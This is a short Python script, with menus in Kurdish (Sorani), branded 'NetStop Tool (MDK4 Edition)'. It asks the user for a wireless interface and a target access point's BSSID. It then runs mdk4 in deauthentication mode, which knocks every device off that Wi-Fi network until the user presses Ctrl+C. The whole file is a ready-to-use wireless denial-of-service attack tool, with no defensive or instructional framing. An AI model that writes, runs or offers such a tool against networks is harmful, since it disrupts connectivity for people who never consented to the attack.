#!/usr/bin/env python3
import subprocess
import os
import sys
import time

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"{GREEN} _  _ _  _ ____ ___  _ ____ ___ ____ _  _ {RESET}")
    print(f"{GREEN} |_/  |  | |__/ |  \ | [__   |  |__| |\ | {RESET}")
    print(f"{YELLOW} | \_ |__| |  \ |__/ | ___]  |  |  | | \| {RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{YELLOW} ئامرازی کۆنتڕۆڵ و bڕینی گشتی تۆڕ لە ڕێگەی هەواوە{RESET}")
    print(f"{CYAN}==============================================={RESET}")

def start_attack(interface, bssid):
    show_banner()
    print(f"{RED}[+] هێرشی بڕینی هێڵ چالاک کرا لەسەر: {bssid}{RESET}")
    print(f"{YELLOW}[*] بۆ ڕاگرتنی هێرشەکە، دابگرە (Ctrl + C){RESET}")
    
    command = ["sudo", "mdk4", interface, "d", "-a", bssid]
    try:
        subprocess.run(command)
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] هێرشەکە ڕاگیرا و هێڵ بۆ ئامێرەکان گەڕایەوە. ✅{RESET}")
        time.sleep(2)

def main():
    if os.geteuid() != 0:
        print(f"{RED}[-] تکایە ئامرازەکە وەک بەرپرسیار (sudo) ڕاکەرەوە!{RESET}")
        sys.exit(1)

    while True:
        show_banner()
        print(f"{CYAN}[1]{RESET} ده‌ستپێکردنی هێرشی بڕینی هێڵ 🚫")
        print(f"{CYAN}[2]{RESET} چوونەدەرەوە لە ئامرازەکە ❌")
        
        choice = input(f"{YELLOW}ژمارەیەک هەڵبژێره‌ (1 یان 2): {RESET}").strip()
        
        if choice == '1':
            show_banner()
            interface = input(f"{CYAN}[*] ناوی کارت (wlan0mon): {RESET}").strip()
            bssid = input(f"{CYAN}[*] ماک ئەدرەس (BSSID): {RESET}").strip()
            
            if not interface or not bssid:
                print(f"{RED}[-] تکایە زانیارییەکان بە دروستی پڕبکەرەوە!{RESET}")
                time.sleep(1.5)
                continue
            start_attack(interface, bssid)
        elif choice == '2':
            print(f"{GREEN}\nسوپاس بۆ بەکارهێنانی ئامرازەکە! خوا حافیز 👋{RESET}")
            break
        else:
            print(f"{RED}[-] هەڵبژاردنی نادروست!{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main()
